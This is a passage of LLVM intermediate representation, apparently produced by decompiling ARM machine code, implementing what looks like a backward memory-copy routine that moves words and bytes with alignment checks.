  store i32 %v9_168dc, i32* %v8_168dc, align 4
  %v10_168dc = add i32 %v0_168dc, -4
  %v11_168dc = inttoptr i32 %v10_168dc to i32*
  %v12_168dc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_168dc, i32* %v11_168dc, align 4
  store i32 %v1_168dc, i32* %r0.global-to-local, align 4
  %v0_168e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_168e0 = add i32 %v0_168e0, -4
  %v2_168e0 = inttoptr i32 %v1_168e0 to i32*
  %v3_168e0 = load i32, i32* %v2_168e0, align 4
  store i32 %v3_168e0, i32* @r3, align 4
  %v4_168e0 = add i32 %v0_168e0, -8
  %v5_168e0 = inttoptr i32 %v4_168e0 to i32*
  %v6_168e0 = load i32, i32* %v5_168e0, align 4
  store i32 %v6_168e0, i32* %r4.global-to-local, align 4
  %v7_168e0 = add i32 %v0_168e0, -12
  %v8_168e0 = inttoptr i32 %v7_168e0 to i32*
  %v9_168e0 = load i32, i32* %v8_168e0, align 4
  store i32 %v9_168e0, i32* @ip, align 4
  %v10_168e0 = add i32 %v0_168e0, -16
  %v11_168e0 = inttoptr i32 %v10_168e0 to i32*
  %v12_168e0 = load i32, i32* %v11_168e0, align 4
  store i32 %v12_168e0, i32* %lr.global-to-local, align 4
  store i32 %v10_168e0, i32* %r1.global-to-local, align 4
  %v1_168e4 = add i32 %v0_168dc, -32
  %v2_168e4 = inttoptr i32 %v1_168e4 to i32*
  store i32 %v3_168e0, i32* %v2_168e4, align 4
  %v4_168e4 = add i32 %v0_168dc, -28
  %v5_168e4 = inttoptr i32 %v4_168e4 to i32*
  %v6_168e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_168e4, i32* %v5_168e4, align 4
  %v7_168e4 = add i32 %v0_168dc, -24
  %v8_168e4 = inttoptr i32 %v7_168e4 to i32*
  %v9_168e4 = load i32, i32* @ip, align 4
  store i32 %v9_168e4, i32* %v8_168e4, align 4
  %v10_168e4 = add i32 %v0_168dc, -20
  %v11_168e4 = inttoptr i32 %v10_168e4 to i32*
  %v12_168e4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_168e4, i32* %v11_168e4, align 4
  store i32 %v1_168e4, i32* %r0.global-to-local, align 4
  %v0_168e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_168e8 = add i32 %v0_168e8, -32
  store i32 %v2_168e8, i32* %r2.global-to-local, align 4
  %v6_168ec = icmp slt i32 %v0_168e8, 32
  br i1 %v6_168ec, label %dec_label_pc_168f0.loopexit, label %dec_label_pc_168d8.dec_label_pc_168d8_crit_edge

dec_label_pc_168d8.dec_label_pc_168d8_crit_edge:  ; preds = %dec_label_pc_168d8
  %v0_168d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_168d8

dec_label_pc_168f0.loopexit:                      ; preds = %dec_label_pc_168d8
  %v4_168e8 = sub i32 31, %v0_168e8
  %v5_168e8 = and i32 %v4_168e8, %v0_168e8
  %v6_168e8 = icmp slt i32 %v5_168e8, 0
  %v7_168e8 = icmp slt i32 %v2_168e8, 0
  store i1 %v6_168e8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_168e8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_168f0

dec_label_pc_168f0:                               ; preds = %dec_label_pc_168f0.loopexit, %dec_label_pc_168cc
  %v6_168f8 = phi i32 [ %v1_168e4, %dec_label_pc_168f0.loopexit ], [ %v0_168dc37, %dec_label_pc_168cc ]
  %v0_16900.pr = phi i32 [ %v2_168e8, %dec_label_pc_168f0.loopexit ], [ %v2_168d0, %dec_label_pc_168cc ]
  %v4_168f0 = add i32 %v0_16900.pr, 16
  %v6_168f0 = sub i32 0, %v0_16900.pr
  %v7_168f0 = and i32 %v4_168f0, %v6_168f0
  %v8_168f0 = icmp slt i32 %v7_168f0, 0
  store i1 %v8_168f0, i1* %cpsr_v.global-to-local, align 1
  %v9_168f0 = icmp slt i32 %v4_168f0, 0
  store i1 %v9_168f0, i1* %cpsr_n.global-to-local, align 1
  %v10_168f0 = icmp eq i32 %v4_168f0, 0
  store i1 %v10_168f0, i1* %cpsr_z.global-to-local, align 1
  %v5_168f4 = icmp slt i32 %v0_16900.pr, -16
  br i1 %v5_168f4, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_168f0
  %v6_168f4 = load i32, i32* %r1.global-to-local, align 4
  %v7_168f4 = add i32 %v6_168f4, -4
  %v8_168f4 = inttoptr i32 %v7_168f4 to i32*
  %v9_168f4 = load i32, i32* %v8_168f4, align 4
  store i32 %v9_168f4, i32* @r3, align 4
  %v10_168f4 = add i32 %v6_168f4, -8
  %v11_168f4 = inttoptr i32 %v10_168f4 to i32*
  %v12_168f4 = load i32, i32* %v11_168f4, align 4
  store i32 %v12_168f4, i32* %r4.global-to-local, align 4
  %v13_168f4 = add i32 %v6_168f4, -12
  %v14_168f4 = inttoptr i32 %v13_168f4 to i32*
  %v15_168f4 = load i32, i32* %v14_168f4, align 4
  store i32 %v15_168f4, i32* @ip, align 4
  %v16_168f4 = add i32 %v6_168f4, -16
  %v17_168f4 = inttoptr i32 %v16_168f4 to i32*
  %v18_168f4 = load i32, i32* %v17_168f4, align 4
  store i32 %v18_168f4, i32* %lr.global-to-local, align 4
  store i32 %v16_168f4, i32* %r1.global-to-local, align 4
  %v7_168f8 = add i32 %v6_168f8, -16
  %v8_168f8 = inttoptr i32 %v7_168f8 to i32*
  store i32 %v9_168f4, i32* %v8_168f8, align 4
  %v10_168f8 = add i32 %v6_168f8, -12
  %v11_168f8 = inttoptr i32 %v10_168f8 to i32*
  %v12_168f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_168f8, i32* %v11_168f8, align 4
  %v13_168f8 = add i32 %v6_168f8, -8
  %v14_168f8 = inttoptr i32 %v13_168f8 to i32*
  %v15_168f8 = load i32, i32* @ip, align 4
  store i32 %v15_168f8, i32* %v14_168f8, align 4
  %v16_168f8 = add i32 %v6_168f8, -4
  %v17_168f8 = inttoptr i32 %v16_168f8 to i32*
  %v18_168f8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_168f8, i32* %v17_168f8, align 4
  store i32 %v7_168f8, i32* %r0.global-to-local, align 4
  %v6_168fc = load i32, i32* %r2.global-to-local, align 4
  %v7_168fc = add i32 %v6_168fc, -16
  store i32 %v7_168fc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_168f0, %bb147
  %v6_16908 = phi i32 [ %v7_168f8, %bb147 ], [ %v6_168f8, %dec_label_pc_168f0 ]
  %v0_16900 = phi i32 [ %v7_168fc, %bb147 ], [ %v0_16900.pr, %dec_label_pc_168f0 ]
  %v4_16900 = add i32 %v0_16900, 20
  store i32 %v4_16900, i32* %r2.global-to-local, align 4
  %v6_16900 = sub i32 0, %v0_16900
  %v7_16900 = and i32 %v4_16900, %v6_16900
  %v8_16900 = icmp slt i32 %v7_16900, 0
  store i1 %v8_16900, i1* %cpsr_v.global-to-local, align 1
  %v9_16900 = icmp slt i32 %v4_16900, 0
  store i1 %v9_16900, i1* %cpsr_n.global-to-local, align 1
  %v10_16900 = icmp eq i32 %v4_16900, 0
  store i1 %v10_16900, i1* %cpsr_z.global-to-local, align 1
  %v5_16904 = icmp slt i32 %v0_16900, -20
  br i1 %v5_16904, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_16904 = load i32, i32* %r1.global-to-local, align 4
  %v7_16904 = add i32 %v6_16904, -4
  %v8_16904 = inttoptr i32 %v7_16904 to i32*
  %v9_16904 = load i32, i32* %v8_16904, align 4
  store i32 %v9_16904, i32* @r3, align 4
  %v10_16904 = add i32 %v6_16904, -8
  %v11_16904 = inttoptr i32 %v10_16904 to i32*
  %v12_16904 = load i32, i32* %v11_16904, align 4
  store i32 %v12_16904, i32* @ip, align 4
  %v13_16904 = add i32 %v6_16904, -12
  %v14_16904 = inttoptr i32 %v13_16904 to i32*
  %v15_16904 = load i32, i32* %v14_16904, align 4
  store i32 %v15_16904, i32* %lr.global-to-local, align 4
  store i32 %v13_16904, i32* %r1.global-to-local, align 4
  %v7_16908 = add i32 %v6_16908, -12
  %v8_16908 = inttoptr i32 %v7_16908 to i32*
  store i32 %v9_16904, i32* %v8_16908, align 4
  %v10_16908 = add i32 %v6_16908, -8
  %v11_16908 = inttoptr i32 %v10_16908 to i32*
  %v12_16908 = load i32, i32* @ip, align 4
  store i32 %v12_16908, i32* %v11_16908, align 4
  %v13_16908 = add i32 %v6_16908, -4
  %v14_16908 = inttoptr i32 %v13_16908 to i32*
  %v15_16908 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_16908, i32* %v14_16908, align 4
  store i32 %v7_16908, i32* %r0.global-to-local, align 4
  %v6_1690c = load i32, i32* %r2.global-to-local, align 4
  %v7_1690c = add i32 %v6_1690c, -12
  store i32 %v7_1690c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1692c45 = phi i32 [ %v6_16908, %.thread2 ], [ %v7_16908, %bb148 ]
  %v0_1691443 = phi i32 [ %v4_16900, %.thread2 ], [ %v7_1690c, %bb148 ]
  %v2_16910 = load i8*, i8** %stack_var_-8, align 4
  %v3_16910 = ptrtoint i8* %v2_16910 to i32
  store i32 %v3_16910, i32* @r4, align 4
  store i32 %v8_168cc, i32* @lr, align 4
  br label %dec_label_pc_16914

dec_label_pc_16914:                               ; preds = %dec_label_pc_168c4, %.thread4
  %v7_16924 = phi i32 [ %v0_168dc37, %dec_label_pc_168c4 ], [ %v6_1692c45, %.thread4 ]
  %v0_16914 = phi i32 [ %v2_168c4, %dec_label_pc_168c4 ], [ %v0_1691443, %.thread4 ]
  %v2_16914 = add i32 %v0_16914, 8
  store i32 %v2_16914, i32* %r2.global-to-local, align 4
  %v4_16914 = sub i32 0, %v0_16914
  %v5_16914 = and i32 %v2_16914, %v4_16914
  %v6_16914 = icmp slt i32 %v5_16914, 0
  store i1 %v6_16914, i1* %cpsr_v.global-to-local, align 1
  %v7_16914 = icmp slt i32 %v2_16914, 0
  store i1 %v7_16914, i1* %cpsr_n.global-to-local, align 1
  %v8_16914 = icmp eq i32 %v2_16914, 0
  store i1 %v8_16914, i1* %cpsr_z.global-to-local, align 1
  %v5_16918 = icmp slt i32 %v0_16914, -8
  br i1 %v5_16918, label %bb150, label %dec_label_pc_1691c

dec_label_pc_1691c:                               ; preds = %dec_label_pc_16914
  %v6_1691c = add i32 %v0_16914, 4
  store i32 %v6_1691c, i32* %r2.global-to-local, align 4
  %v8_1691c = sub i32 -5, %v0_16914
  %v9_1691c = and i32 %v8_1691c, %v2_16914
  %v10_1691c = icmp slt i32 %v9_1691c, 0
  store i1 %v10_1691c, i1* %cpsr_v.global-to-local, align 1
  %v11_1691c = icmp slt i32 %v6_1691c, 0
  store i1 %v11_1691c, i1* %cpsr_n.global-to-local, align 1
  %v12_1691c = icmp eq i32 %v2_16914, 4
  store i1 %v12_1691c, i1* %cpsr_z.global-to-local, align 1
  %v5_16920 = icmp slt i32 %v2_16914, 4
  %v6_16920 = load i32, i32* %r1.global-to-local, align 4
  %v7_16920 = add i32 %v6_16920, -4
  %v8_16920 = inttoptr i32 %v7_16920 to i32*
  %v9_16920 = load i32, i32* %v8_16920, align 4
  store i32 %v9_16920, i32* @r3, align 4
  br i1 %v5_16920, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1691c
  store i32 %v7_16920, i32* %r1.global-to-local, align 4
  %v8_16924 = add i32 %v7_16924, -4
  %v9_16924 = inttoptr i32 %v8_16924 to i32*
  store i32 %v9_16920, i32* %v9_16924, align 4
  %v10_16924 = load i32, i32* %r0.global-to-local, align 4
  %v11_16924 = add i32 %v10_16924, -4
  store i32 %v11_16924, i32* %r0.global-to-local, align 4
  %v0_16934.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1691c
  %v10_16928 = add i32 %v6_16920, -8
  %v11_16928 = inttoptr i32 %v10_16928 to i32*
  %v12_16928 = load i32, i32* %v11_16928, align 4
  store i32 %v12_16928, i32* @ip, align 4
  store i32 %v10_16928, i32* %r1.global-to-local, align 4
  %v7_1692c = add i32 %v7_16924, -8
  %v8_1692c = inttoptr i32 %v7_1692c to i32*
  store i32 %v9_16920, i32* %v8_1692c, align 4
  %v10_1692c = add i32 %v7_16924, -4
  %v11_1692c = inttoptr i32 %v10_1692c to i32*
  %v12_1692c = load i32, i32* @ip, align 4
  store i32 %v12_1692c, i32* %v11_1692c, align 4
  store i32 %v7_1692c, i32* %r0.global-to-local, align 4
  %v6_16930 = load i32, i32* %r2.global-to-local, align 4
  %v7_16930 = add i32 %v6_16930, -4
  store i32 %v7_16930, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_16914, %dec_label_pc_168a4, %dec_label_pc_16ad8, %dec_label_pc_16a6c, %dec_label_pc_16a00, %bb149
  %v2_16938 = phi i32 [ %v11_16924, %.thread8 ], [ %v0_169d020, %.thread14 ], [ %v7_16924, %dec_label_pc_16914 ], [ %v2_168a8, %dec_label_pc_168a4 ], [ %v2_1694453, %dec_label_pc_16ad8 ], [ %v2_1694452, %dec_label_pc_16a6c ], [ %v2_1694451, %dec_label_pc_16a00 ], [ %v7_1692c, %bb149 ]
  %v0_16934 = phi i32 [ %v0_16934.pre, %.thread8 ], [ %v2_16978, %.thread14 ], [ %v2_16914, %dec_label_pc_16914 ], [ %v2_168ac, %dec_label_pc_168a4 ], [ %v0_1693449, %dec_label_pc_16ad8 ], [ %v0_1693448, %dec_label_pc_16a6c ], [ %v0_1693447, %dec_label_pc_16a00 ], [ %v7_16930, %bb149 ]
  %v1_16934 = add i32 %v0_16934, 4
  store i32 %v1_16934, i32* %r2.global-to-local, align 4
  %v3_16934 = sub i32 0, %v0_16934
  %v4_16934 = and i32 %v1_16934, %v3_16934
  %v5_16934 = icmp slt i32 %v4_16934, 0
  store i1 %v5_16934, i1* %cpsr_v.global-to-local, align 1
  %v6_16934 = icmp slt i32 %v1_16934, 0
  store i1 %v6_16934, i1* %cpsr_n.global-to-local, align 1
  %v7_16934 = icmp eq i32 %v1_16934, 0
  store i1 %v7_16934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16934, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1693c = add i32 %v0_16934, 2
  %v3_1693c = sub i32 -3, %v0_16934
  %v4_1693c = and i32 %v3_1693c, %v1_16934
  %v5_1693c = icmp slt i32 %v4_1693c, 0
  store i1 %v5_1693c, i1* %cpsr_v.global-to-local, align 1
  %v6_1693c = icmp slt i32 %v1_1693c, 0
  store i1 %v6_1693c, i1* %cpsr_n.global-to-local, align 1
  %v7_1693c = icmp eq i32 %v1_16934, 2
  store i1 %v7_1693c, i1* %cpsr_z.global-to-local, align 1
  %v0_16940 = load i32, i32* %r1.global-to-local, align 4
  %v1_16940 = add i32 %v0_16940, -1
  %v2_16940 = inttoptr i32 %v1_16940 to i8*
  %v3_16940 = load i8, i8* %v2_16940, align 1
  %v4_16940 = zext i8 %v3_16940 to i32
  store i32 %v4_16940, i32* @r3, align 4
  store i32 %v1_16940, i32* %r1.global-to-local, align 4
  %v3_16944 = add i32 %v2_16938, -1
  %v4_16944 = inttoptr i32 %v3_16944 to i8*
  store i8 %v3_16940, i8* %v4_16944, align 1
  %v5_16944 = load i32, i32* %r0.global-to-local, align 4
  %v6_16944 = add i32 %v5_16944, -1
  store i32 %v6_16944, i32* %r0.global-to-local, align 4
  %v0_16948 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16948 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16948 = xor i1 %v0_16948, %v1_16948
  br i1 %v2_16948, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_16948 = load i32, i32* %r1.global-to-local, align 4
  %v4_16948 = add i32 %v3_16948, -1
  %v5_16948 = inttoptr i32 %v4_16948 to i8*
  %v6_16948 = load i8, i8* %v5_16948, align 1
  %v7_16948 = zext i8 %v6_16948 to i32
  store i32 %v7_16948, i32* @r3, align 4
  store i32 %v4_16948, i32* %r1.global-to-local, align 4
  %v6_1694c = add i32 %v5_16944, -2
  %v7_1694c = inttoptr i32 %v6_1694c to i8*
  store i8 %v6_16948, i8* %v7_1694c, align 1
  %v8_1694c = load i32, i32* %r0.global-to-local, align 4
  %v9_1694c = add i32 %v8_1694c, -1
  store i32 %v9_1694c, i32* %r0.global-to-local, align 4
  %v1_16950.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16950.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_16954 = phi i32 [ %v9_1694c, %bb152 ], [ %v6_16944, %bb151 ]
  %v2_16954 = phi i1 [ %v2_16950.pre, %bb152 ], [ %v1_16948, %bb151 ]
  %v1_16954 = phi i1 [ %v1_16950.pre, %bb152 ], [ %v0_16948, %bb151 ]
  %v0_16950 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16950 = xor i1 %v2_16954, %v1_16954
  %v4_16950 = or i1 %v0_16950, %v3_16950
  br i1 %v4_16950, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_16950 = load i32, i32* %r1.global-to-local, align 4
  %v6_16950 = add i32 %v5_16950, -1
  %v7_16950 = inttoptr i32 %v6_16950 to i8*
  %v8_16950 = load i8, i8* %v7_16950, align 1
  %v9_16950 = zext i8 %v8_16950 to i32
  store i32 %v9_16950, i32* @r3, align 4
  store i32 %v6_16950, i32* %r1.global-to-local, align 4
  %v8_16954 = add i32 %v7_16954, -1
  %v9_16954 = inttoptr i32 %v8_16954 to i8*
  store i8 %v8_16950, i8* %v9_16954, align 1
  %v10_16954 = load i32, i32* %r0.global-to-local, align 4
  %v11_16954 = add i32 %v10_16954, -1
  store i32 %v11_16954, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1695c:                               ; preds = %dec_label_pc_168b4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1695c = icmp eq i32 %v1_168b4, 1
  store i1 %v8_1695c, i1* %cpsr_n.global-to-local, align 1
  %v9_1695c = icmp eq i32 %v1_168b4, 2
  store i1 %v9_1695c, i1* %cpsr_z.global-to-local, align 1
  %v1_16960 = add i32 %v2_168a4, -1
  %v2_16960 = inttoptr i32 %v1_16960 to i8*
  %v3_16960 = load i8, i8* %v2_16960, align 1
  %v4_16960 = zext i8 %v3_16960 to i32
  store i32 %v4_16960, i32* @r3, align 4
  store i32 %v1_16960, i32* %r1.global-to-local, align 4
  %v3_16964 = add i32 %v2_168a8, -1
  %v4_16964 = inttoptr i32 %v3_16964 to i8*
  store i8 %v3_16960, i8* %v4_16964, align 1
  %v5_16964 = load i32, i32* %r0.global-to-local, align 4
  %v6_16964 = add i32 %v5_16964, -1
  store i32 %v6_16964, i32* %r0.global-to-local, align 4
  br i1 %v8_1695c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_1695c
  %v6_16968 = load i32, i32* %r1.global-to-local, align 4
  %v7_16968 = add i32 %v6_16968, -1
  %v8_16968 = inttoptr i32 %v7_16968 to i8*
  %v9_16968 = load i8, i8* %v8_16968, align 1
  %v10_16968 = zext i8 %v9_16968 to i32
  store i32 %v10_16968, i32* @r3, align 4
  store i32 %v7_16968, i32* %r1.global-to-local, align 4
  %v9_1696c = add i32 %v5_16964, -2
  %v10_1696c = inttoptr i32 %v9_1696c to i8*
  store i8 %v9_16968, i8* %v10_1696c, align 1
  %v11_1696c = load i32, i32* %r0.global-to-local, align 4
  %v12_1696c = add i32 %v11_1696c, -1
  store i32 %v12_1696c, i32* %r0.global-to-local, align 4
  br i1 %v9_1695c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_16970 = load i32, i32* %r1.global-to-local, align 4
  %v9_16970 = add i32 %v8_16970, -1
  %v10_16970 = inttoptr i32 %v9_16970 to i8*
  %v11_16970 = load i8, i8* %v10_16970, align 1
  %v12_16970 = zext i8 %v11_16970 to i32
  store i32 %v12_16970, i32* @r3, align 4
  store i32 %v9_16970, i32* %r1.global-to-local, align 4
  %v11_16974 = add i32 %v11_1696c, -2
  %v12_16974 = inttoptr i32 %v11_16974 to i8*
  store i8 %v11_16970, i8* %v12_16974, align 1
  %v13_16974 = load i32, i32* %r0.global-to-local, align 4
  %v14_16974 = add i32 %v13_16974, -1
  store i32 %v14_16974, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_1695c, %bb155
  %v0_169d020 = phi i32 [ %v12_1696c, %bb154 ], [ %v6_16964, %dec_label_pc_1695c ], [ %v14_16974, %bb155 ]
  %v0_16978 = load i32, i32* %r2.global-to-local, align 4
  %v1_16978 = load i32, i32* @ip, align 4
  %v2_16978 = sub i32 %v0_16978, %v1_16978
  store i32 %v2_16978, i32* %r2.global-to-local, align 4
  %v4_16978 = xor i32 %v1_16978, %v0_16978
  %v5_16978 = xor i32 %v2_16978, %v0_16978
  %v6_16978 = and i32 %v5_16978, %v4_16978
  %v7_16978 = icmp slt i32 %v6_16978, 0
  store i1 %v7_16978, i1* %cpsr_v.global-to-local, align 1
  %v8_16978 = icmp slt i32 %v2_16978, 0
  store i1 %v8_16978, i1* %cpsr_n.global-to-local, align 1
  %v9_16978 = icmp eq i32 %v0_16978, %v1_16978
  store i1 %v9_16978, i1* %cpsr_z.global-to-local, align 1
  %v5_1697c = icmp slt i32 %v0_16978, %v1_16978
  br i1 %v5_1697c, label %bb150, label %dec_label_pc_16980

dec_label_pc_16980:                               ; preds = %.thread14
  %v0_16980 = load i32, i32* %r1.global-to-local, align 4
  %v1_16980 = urem i32 %v0_16980, 4
  store i32 %v1_16980, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16980 = icmp eq i32 %v1_16980, 0
  store i1 %v2_16980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16980, label %dec_label_pc_168c4, label %dec_label_pc_16988

dec_label_pc_16988:                               ; preds = %dec_label_pc_168bc, %dec_label_pc_16980
  %v0_169d019 = phi i32 [ %v2_168a8, %dec_label_pc_168bc ], [ %v0_169d020, %dec_label_pc_16980 ]
  %v0_16a7c = phi i32 [ %v2_168ac, %dec_label_pc_168bc ], [ %v2_16978, %dec_label_pc_16980 ]
  %v0_16988 = phi i32 [ %v2_168a4, %dec_label_pc_168bc ], [ %v0_16980, %dec_label_pc_16980 ]
  %v0_16990 = phi i32 [ %v1_168bc, %dec_label_pc_168bc ], [ %v1_16980, %dec_label_pc_16980 ]
  %v1_16988 = and i32 %v0_16988, -4
  store i32 %v1_16988, i32* %r1.global-to-local, align 4
  %v1_1698c = inttoptr i32 %v1_16988 to i32*
  %v2_1698c = load i32, i32* %v1_1698c, align 4
  store i32 %v2_1698c, i32* @r3, align 4
  %v7_16990 = icmp ult i32 %v0_16990, 2
  %v2_16a74 = add i32 %v0_16a7c, -12
  %v4_16a74 = sub i32 11, %v0_16a7c
  %v5_16a74 = and i32 %v4_16a74, %v0_16a7c
  %v6_16a74 = icmp slt i32 %v5_16a74, 0
  store i1 %v6_16a74, i1* %cpsr_v.global-to-local, align 1
  %v7_16a74 = icmp slt i32 %v2_16a74, 0
  store i1 %v7_16a74, i1* %cpsr_n.global-to-local, align 1
  %v8_16a74 = icmp eq i32 %v0_16a7c, 12
  store i1 %v8_16a74, i1* %cpsr_z.global-to-local, align 1
  %v5_16a78 = icmp slt i32 %v0_16a7c, 12
  br i1 %v7_16990, label %dec_label_pc_16a74, label %dec_label_pc_16998

dec_label_pc_16998:                               ; preds = %dec_label_pc_16988
  %v8_16990 = icmp eq i32 %v0_16990, 2
  br i1 %v8_16990, label %dec_label_pc_16a08, label %dec_label_pc_1699c

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16998
  br i1 %v5_16a78, label %dec_label_pc_169e8, label %dec_label_pc_169a4

dec_label_pc_169a4:                               ; preds = %dec_label_pc_1699c
  store i32 %v2_16a74, i32* %r2.global-to-local, align 4
  %v3_169a8 = load i32, i32* @r4, align 4
  store i32 %v3_169a8, i32* %stack_var_-12, align 4
  %v6_169a8 = load i32, i32* @r5, align 4
  %v8_169a8 = inttoptr i32 %v6_169a8 to i8*
  store i8* %v8_169a8, i8** %stack_var_-8, align 4
  %v11_169a8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_169ac

dec_label_pc_169ac:                               ; preds = %dec_label_pc_169ac.dec_label_pc_169ac_crit_edge, %dec_label_pc_169a4
  %v0_169d0 = phi i32 [ %v1_169d0, %dec_label_pc_169ac.dec_label_pc_169ac_crit_edge ], [ %v0_169d019, %dec_label_pc_169a4 ]
  %v0_169b0 = phi i32 [ %v0_169b0.pre, %dec_label_pc_169ac.dec_label_pc_169ac_crit_edge ], [ %v1_16988, %dec_label_pc_169a4 ]
  %v0_169ac = phi i32 [ %v0_169ac.pre, %dec_label_pc_169ac.dec_label_pc_169ac_crit_edge ], [ %v2_1698c, %dec_label_pc_169a4 ]
  %v3_169ac = mul i32 %v0_169ac, 256
  store i32 %v3_169ac, i32* %lr.global-to-local, align 4
  %v1_169b0 = add i32 %v0_169b0, -4
  %v2_169b0 = inttoptr i32 %v1_169b0 to i32*
  %v3_169b0 = load i32, i32* %v2_169b0, align 4
  store i32 %v3_169b0, i32* @r3, align 4
  %v4_169b0 = add i32 %v0_169b0, -8
  %v5_169b0 = inttoptr i32 %v4_169b0 to i32*
  %v6_169b0 = load i32, i32* %v5_169b0, align 4
  store i32 %v6_169b0, i32* %r4.global-to-local, align 4
  %v7_169b0 = add i32 %v0_169b0, -12
  %v8_169b0 = inttoptr i32 %v7_169b0 to i32*
  %v9_169b0 = load i32, i32* %v8_169b0, align 4
  store i32 %v9_169b0, i32* %r5.global-to-local, align 4
  %v10_169b0 = add i32 %v0_169b0, -16
  %v11_169b0 = inttoptr i32 %v10_169b0 to i32*
  %v12_169b0 = load i32, i32* %v11_169b0, align 4
  store i32 %v10_169b0, i32* %r1.global-to-local, align 4
  %v4_169b4 = udiv i32 %v12_169b0, 16777216
  %v5_169b4 = or i32 %v4_169b4, %v3_169ac
  store i32 %v5_169b4, i32* %lr.global-to-local, align 4
  %v3_169b8 = mul i32 %v12_169b0, 256
  %v4_169bc = udiv i32 %v9_169b0, 16777216
  %v5_169bc = or i32 %v3_169b8, %v4_169bc
  store i32 %v5_169bc, i32* @ip, align 4
  %v3_169c0 = mul i32 %v9_169b0, 256
  %v4_169c4 = udiv i32 %v6_169b0, 16777216
  %v5_169c4 = or i32 %v3_169c0, %v4_169c4
  store i32 %v5_169c4, i32* %r5.global-to-local, align 4
  %v3_169c8 = mul i32 %v6_169b0, 256
  %v4_169cc = udiv i32 %v3_169b0, 16777216
  %v5_169cc = or i32 %v3_169c8, %v4_169cc
  store i32 %v5_169cc, i32* %r4.global-to-local, align 4
  %v1_169d0 = add i32 %v0_169d0, -16
  %v2_169d0 = inttoptr i32 %v1_169d0 to i32*
  store i32 %v5_169cc, i32* %v2_169d0, align 4
  %v4_169d0 = add i32 %v0_169d0, -12
  %v5_169d0 = inttoptr i32 %v4_169d0 to i32*
  %v6_169d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_169d0, i32* %v5_169d0, align 4
  %v7_169d0 = add i32 %v0_169d0, -8
  %v8_169d0 = inttoptr i32 %v7_169d0 to i32*
  %v9_169d0 = load i32, i32* @ip, align 4
  store i32 %v9_169d0, i32* %v8_169d0, align 4
  %v10_169d0 = add i32 %v0_169d0, -4
  %v11_169d0 = inttoptr i32 %v10_169d0 to i32*
  %v12_169d0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_169d0, i32* %v11_169d0, align 4
  store i32 %v1_169d0, i32* %r0.global-to-local, align 4
  %v0_169d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_169d4 = add i32 %v0_169d4, -16
  store i32 %v2_169d4, i32* %r2.global-to-local, align 4
  %v6_169d8 = icmp slt i32 %v0_169d4, 16
  br i1 %v6_169d8, label %dec_label_pc_169dc, label %dec_label_pc_169ac.dec_label_pc_169ac_crit_edge

dec_label_pc_169ac.dec_label_pc_169ac_crit_edge:  ; preds = %dec_label_pc_169ac
  %v0_169ac.pre = load i32, i32* @r3, align 4
  %v0_169b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_169ac

dec_label_pc_169dc:                               ; preds = %dec_label_pc_169ac
  %v2_169dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_169dc, i32* @r4, align 4
  %v5_169dc = load i8*, i8** %stack_var_-8, align 4
  %v6_169dc = ptrtoint i8* %v5_169dc to i32
  store i32 %v6_169dc, i32* @r5, align 4
  store i32 %v11_169a8, i32* @lr, align 4
  %v2_169e0 = add i32 %v0_169d4, -4
  store i32 %v2_169e0, i32* %r2.global-to-local, align 4
  %v4_169e0 = add i32 %v0_169d4, 2147483632
  %v5_169e0 = and i32 %v2_169e0, %v4_169e0
  %v6_169e0 = icmp slt i32 %v5_169e0, 0
  store i1 %v6_169e0, i1* %cpsr_v.global-to-local, align 1
  %v7_169e0 = icmp slt i32 %v2_169e0, 0
  store i1 %v7_169e0, i1* %cpsr_n.global-to-local, align 1
  %v8_169e0 = icmp eq i32 %v2_169e0, 0
  store i1 %v8_169e0, i1* %cpsr_z.global-to-local, align 1
  %v5_169e4 = icmp slt i32 %v2_169d4, -12
  br i1 %v5_169e4, label %dec_label_pc_16a00, label %dec_label_pc_169e8

